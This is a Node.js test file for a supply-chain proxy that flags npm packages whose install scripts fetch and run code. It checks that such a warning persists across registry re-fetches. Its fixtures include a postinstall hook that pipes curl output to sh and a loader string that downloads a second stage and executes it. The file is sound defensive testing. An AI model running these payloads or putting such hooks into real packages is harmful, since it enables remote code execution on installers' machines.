// A named tarball check (S0, S5-S9) is a WARN row the walk writes after the download. A later evaluation of the version (every
// fetch of the registry document re-runs the gates) carries that row forward and must keep the record's WARN, as the
// install-manifest-mismatch row's carry does: otherwise the next download prints no warning. A contributing check (S1-S4,
// a NOTE) carried forward moves nothing. Written before the fix. Tarballs are synthetic and nothing is run.
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import http from 'node:http';
import os from 'node:os';
import path from 'node:path';
import zlib from 'node:zlib';
import { createProxyServer } from '../../proxy/server.js';
import { resetDependencyCache } from '../../gates/dependency-cache.js';
import { forgetManifestHooks } from '../../proxy/manifest-check.js';

function hdr(name, size) {
  const h = Buffer.alloc(512, 0); Buffer.from(name, 'utf8').copy(h, 0, 0, 100);
  h.write('0000644\0', 100); h.write('0000000\0', 108); h.write('0000000\0', 116); h.write(`${size.toString(8).padStart(11, '0')}\0`, 124, 'latin1');
  h.write('00000000000\0', 136); h.write('        ', 148); h.write('0', 156, 'latin1'); h.write('ustar\0', 257, 'latin1'); h.write('00', 263, 'latin1');
  let sum = 0; for (let i = 0; i < 512; i += 1) sum += h[i]; h.write(`${sum.toString(8).padStart(6, '0')}\0 `, 148, 'latin1'); return h;
}
const pad = (b) => Buffer.concat([b, Buffer.alloc((512 - (b.length % 512)) % 512, 0)]);
const tgz = (files) => zlib.gzipSync(Buffer.concat([...Object.entries(files).flatMap(([p, c]) => [hdr(`package/${p}`, Buffer.byteLength(c)), pad(Buffer.from(c))]), Buffer.alloc(1024, 0)]));
const LOADER = 'const https = require("https"); const cp = require("child_process");\nhttps.get("https://cdn.example.invalid/stage2", (r) => { let b = ""; r.on("data", (c) => { b += c; }); r.on("end", () => cp.execSync(b)); });\n';
const BENIGN = 'module.exports = 1;\n';
const H = 3_600_000; const T0 = Date.parse('2026-03-01T00:00:00Z'); const at = (h) => new Date(T0 + h * H).toISOString();
// s 1.1.0: another account and no gitHead (identity-break NOTE arms the walk); its postinstall fetches and runs code (S0);
// 1.0.0 already had a postinstall, so install-introduced does not warn: S0 is the only named row
const user = (n) => ({ _npmUser: { name: n, email: `${n}@${n}.example` }, maintainers: [{ name: n, email: `${n}@${n}.example` }], _npmVersion: '10.0.0' });
const docOf = (hook) => ({ name: 's', 'dist-tags': { latest: '1.1.0' }, time: { '1.0.0': at(0), '1.1.0': at(480) }, versions: {
  '1.0.0': { name: 's', version: '1.0.0', main: 'index.js', ...user('a'), gitHead: 'g1', scripts: { postinstall: 'node i.js' } },
  '1.1.0': { name: 's', version: '1.1.0', main: 'index.js', ...user('m'), scripts: { postinstall: hook } } } });

async function withProxy(doc, fn) {
  resetDependencyCache(); forgetManifestHooks();
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'static-carry-'));
  const tb = tgz({ 'package.json': JSON.stringify(doc.versions['1.1.0']), 'index.js': BENIGN, 'i.js': BENIGN });
  const upstream = http.createServer((req, res) => {
    const u = decodeURIComponent(req.url.split('?')[0]);
    if (u === '/s/-/s-1.1.0.tgz') { res.writeHead(200, { 'content-type': 'application/octet-stream' }); res.end(tb); return; }
    if (u === '/s') { res.writeHead(200, { 'content-type': 'application/json' }); res.end(JSON.stringify(doc)); return; }
    res.writeHead(404, { 'content-type': 'application/json' }); res.end('{}');
  });
  await new Promise((r) => upstream.listen(0, '127.0.0.1', r));
  const proxy = createProxyServer({ port: 0, host: '127.0.0.1', upstream: `http://127.0.0.1:${upstream.address().port}`,
    witnessDbPath: path.join(dir, 'witness.db'), headersTimeoutMs: 10_000, bodyTimeoutMs: 10_000 });
  await new Promise((r) => proxy.listen(0, '127.0.0.1', r));
  const base = `http://127.0.0.1:${proxy.address().port}`;
  const logs = []; const realErr = console.error; console.error = (m) => logs.push(String(m));
  try { return await fn({ base, proxy }); } finally {
    console.error = realErr;
    await new Promise((r) => proxy.close(r)); await new Promise((r) => upstream.close(r));
    fs.rmSync(dir, { recursive: true, force: true }); resetDependencyCache(); forgetManifestHooks();
  }
}
const get = (u) => new Promise((resolve, reject) => http.get(u, { agent: false }, (res) => {
  const chunks = []; res.on('data', (x) => chunks.push(x)); res.on('end', () => resolve({ status: res.statusCode, headers: res.headers }));
}).on('error', reject));
const settle = () => new Promise((r) => setTimeout(r, 250));
const latest = (proxy) => proxy.witnessDb.getLatestDecision('s', '1.1.0');
const s0 = (d) => d.gates_fired.find((g) => g.gate === 'static:S0-shell-fetch-in-hook');

test('SC1 a named tarball check keeps the WARN when the registry document is fetched again, and the next download says it', async () => {
  await withProxy(docOf('curl -s http://203.0.113.9/x | sh'), async ({ base, proxy }) => {
    await get(`${base}/s`);
    assert.equal(latest(proxy).disposition, 'ALLOW', 'before the download only the identity-break note');
    await get(`${base}/s/-/s-1.1.0.tgz`); await settle();
    assert.equal(s0(latest(proxy)).result, 'WARN'); assert.equal(latest(proxy).disposition, 'WARN');
    // npm fetches the registry document first on every install: the gates run again and carry the S0 row
    await get(`${base}/s`);
    assert.equal(s0(latest(proxy)).result, 'WARN');
    assert.equal(latest(proxy).disposition, 'WARN', 'the carried named row keeps the WARN');
    const t = await get(`${base}/s/-/s-1.1.0.tgz`); await settle();
    assert.match(String(t.headers['npm-notice']), /^chaingate: WARNING s@1\.1\.0: an install script downloads code to run/);
  });
});

test('SC2 a contributing tarball check carried forward moves nothing: no named row, the disposition stays ALLOW', async () => {
  await withProxy(docOf('node i.js'), async ({ base, proxy }) => {
    await get(`${base}/s`); await get(`${base}/s/-/s-1.1.0.tgz`); await settle();
    assert.equal(s0(latest(proxy)).result, 'ALLOW'); assert.equal(latest(proxy).disposition, 'ALLOW');
    await get(`${base}/s`);
    assert.equal(latest(proxy).disposition, 'ALLOW');
  });
});
